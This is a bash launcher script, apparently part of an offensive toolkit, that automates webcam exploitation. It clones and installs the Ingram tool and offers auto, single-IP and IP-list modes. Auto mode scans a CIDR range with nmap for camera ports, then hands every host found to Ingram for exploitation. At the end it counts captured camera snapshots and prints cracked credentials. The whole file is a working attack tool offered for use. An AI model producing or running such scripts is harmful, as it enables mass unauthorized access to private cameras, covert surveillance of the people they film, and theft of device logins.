#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "INGRAM — WEBCAM AUTO-EXPLOIT" "snapshot · credential attack · stream discovery"

# ── Locate Ingram (cloned via setup-tools.sh) ────────────────────────────────
require_tool python3 "apt install python3"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INGRAM_SCRIPT="$SCRIPT_DIR/tool/run_ingram.py"
_INGRAM_CMD=""

if [[ -f "$INGRAM_SCRIPT" ]]; then
    _INGRAM_CMD="python3 $INGRAM_SCRIPT"
fi

if [[ -z "$_INGRAM_CMD" ]]; then
    printf '  %s[!]%s Ingram tool not found at %s/tool/%s\n\n' "${RED}" "${RESET}" "$SCRIPT_DIR" "${RESET}"
    printf '  %s[*]%s Run setup-tools.sh to clone it, or clone manually:%s\n' "${CYAN}" "${RESET}" "${RESET}"
    printf '      %sgit clone https://github.com/jorhelp/Ingram %s/tool%s\n\n' "${DIM}" "$SCRIPT_DIR" "${RESET}"
    printf '  %s>>%s Clone now? [Y/n]: ' "${CYAN}" "${RESET}"
    read -r _do_clone  || _do_clone="n"
    if [[ "${_do_clone,,}" != "n" ]]; then
        printf '\n'
        if git clone --quiet --depth 1 https://github.com/jorhelp/Ingram "$SCRIPT_DIR/tool" 2>&1; then
            printf '  %s[✔]%s Ingram cloned\n\n' "${GREEN}" "${RESET}"
            _INGRAM_CMD="python3 $INGRAM_SCRIPT"
            # Install requirements
            if [[ -f "$SCRIPT_DIR/tool/requirements.txt" ]]; then
                pip install --quiet --break-system-packages \
                    -r "$SCRIPT_DIR/tool/requirements.txt" &>/dev/null 2>&1 || \
                pip install --quiet -r "$SCRIPT_DIR/tool/requirements.txt" &>/dev/null 2>&1 || true
            fi
        else
            printf '  %s[!]%s Clone failed — check internet connection.\n\n' "${RED}" "${RESET}"
            exit 1
        fi
    else
        exit 0
    fi
fi

# Quick dependency check
_missing_deps=()
for _dep in requests PIL paramiko colorama tqdm; do
    python3 -c "import ${_dep}" &>/dev/null 2>&1 || _missing_deps+=("$_dep")
done
if [[ ${#_missing_deps[@]} -gt 0 ]]; then
    printf '  %s[~]%s Installing missing deps: %s%s\n' "${YELLOW}" "${RESET}" "${_missing_deps[*]}" "${RESET}"
    for _dep in "${_missing_deps[@]}"; do
        [[ "$_dep" == "PIL" ]] && _pkg="Pillow" || _pkg="$_dep"
        pip install --quiet --break-system-packages "$_pkg" &>/dev/null 2>&1 \
            || pip install --quiet "$_pkg" &>/dev/null 2>&1 || true
    done
fi
printf '  %s[✔]%s Ingram ready — %s%s%s\n\n' "${GREEN}" "${RESET}" "${DIM}" "$INGRAM_SCRIPT" "${RESET}"

# ── Target input ──────────────────────────────────────────────────────────────
target="$(prompt_target)"
outdir="$(make_outdir)"
_ingram_out="${outdir}/ingram_out"
# Ingram only creates snapshots/ when ingram_out/ does not yet exist.
# Pre-creating both prevents FileNotFoundError in SnapshotPipeline.__init__.
mkdir -p "$_ingram_out/snapshots"

printf '  %s[SYS]%s Target  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$target" "${RESET}"
printf '  %s[SYS]%s Output  : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_ingram_out" "${RESET}"

# ── Mode selection ────────────────────────────────────────────────────────────
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  SCAN MODE                                       │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'
printf '  %s[01]%s ▶  Auto    scan CIDR + exploit found cameras\n'   "${GREEN}" "${RESET}"
printf '  %s[02]%s ▶  Single  target one IP directly\n'              "${CYAN}" "${RESET}"
printf '  %s[03]%s ▶  List    provide a file of IPs\n'               "${CYAN}" "${RESET}"
printf '\n'
printf '  %s>>%s ' "${CYAN}" "${RESET}"
read -r _mode  || _mode="1"

_ip_file=""
_cleanup_file=0

case "${_mode:-1}" in
  2)
    # Single IP — write to temp file
    printf '  %s>>%s Camera IP: ' "${CYAN}" "${RESET}"
    read -r _single_ip  || _single_ip=""
    if [[ -z "${_single_ip:-}" ]]; then
      printf '  %s[!] No IP entered.%s\n\n' "${RED}" "${RESET}"
      exit 1
    fi
    _ip_file="/tmp/.fsec_ingram_$$"
    printf '%s\n' "$_single_ip" > "$_ip_file"
    _cleanup_file=1
    ;;
  3)
    printf '  %s>>%s Path to IP list file: ' "${CYAN}" "${RESET}"
    read -r _ip_file  || _ip_file=""
    if [[ -z "${_ip_file:-}" || ! -f "$_ip_file" ]]; then
      printf '  %s[!] File not found.%s\n\n' "${RED}" "${RESET}"
      exit 1
    fi
    ;;
  *)
    # Auto — first do a quick nmap to find cameras, then feed to Ingram
    section "CAMERA DISCOVERY  (rootless -sT)"
    printf '  %s[*]%s Scanning %s for camera ports 80,443,554,8080,8554...%s\n' \
      "${CYAN}" "${RESET}" "$target" "${RESET}"

    _ip_file="/tmp/.fsec_ingram_$$"
    _cleanup_file=1

    start_spin "nmap running"
    nmap -sT --unprivileged -Pn -n -T4 --open \
      -p 80,443,554,8080,8554,8000,37777 \
      "$target" 2>/dev/null \
    | grep "scan report" \
    | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' \
    > "$_ip_file" || true
    stop_spin

    _count=$(wc -l < "$_ip_file" 2>/dev/null || echo 0)
    if [[ "$_count" -eq 0 ]]; then
      printf '  %s[~]%s No camera ports found on %s.%s\n\n' "${YELLOW}" "${RESET}" "$target" "${RESET}"
      rm -f "$_ip_file"
      exit 0
    fi
    printf '  %s[+]%s %s%d%s host(s) with camera ports — handing to Ingram\n\n' \
      "${GREEN}" "${RESET}" "${CYAN}" "$_count" "${RESET}"
    ;;
esac

# ── Run Ingram ────────────────────────────────────────────────────────────────
section "INGRAM EXPLOIT"
printf '  %s[*]%s Targets file : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$_ip_file" "${RESET}"
printf '  %s[*]%s Output dir   : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_ingram_out" "${RESET}"

trap '[[ $_cleanup_file -eq 1 ]] && rm -f "$_ip_file" 2>/dev/null; true' EXIT INT

# shellcheck disable=SC2086
$_INGRAM_CMD -i "$_ip_file" -o "$_ingram_out" || true

# ── Results summary ───────────────────────────────────────────────────────────
printf '\n'
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  RESULTS                                         │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'

_snap_dir="${_ingram_out}/snapshots"
_snaps=0
if [[ -d "$_snap_dir" ]]; then
  _snaps=$(find "$_snap_dir" -maxdepth 1 \( -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" \) 2>/dev/null | wc -l)
fi

_cred_file="${_ingram_out}/cracked.txt"
_creds=0
if [[ -f "$_cred_file" ]]; then
  _creds=$(grep -c "." "$_cred_file" 2>/dev/null || echo 0)
fi

printf '  %s[SYS]%s Snapshots captured : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_snaps" "${RESET}"
printf '  %s[SYS]%s Credentials found  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_creds" "${RESET}"
printf '  %s[SYS]%s Output directory   : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_ingram_out" "${RESET}"

if [[ $_snaps -gt 0 ]]; then
  printf '  %s[✔] Camera snapshots saved — check %s%s\n\n' "${GREEN}" "$_snap_dir" "${RESET}"
fi
if [[ $_creds -gt 0 ]]; then
  printf '  %s[✔] Cracked credentials:%s\n' "${GREEN}" "${RESET}"
  cat "$_cred_file" | while IFS= read -r _line; do
    printf '  %s      %s%s\n' "${GREEN}" "$_line" "${RESET}"
  done
  printf '\n'
fi
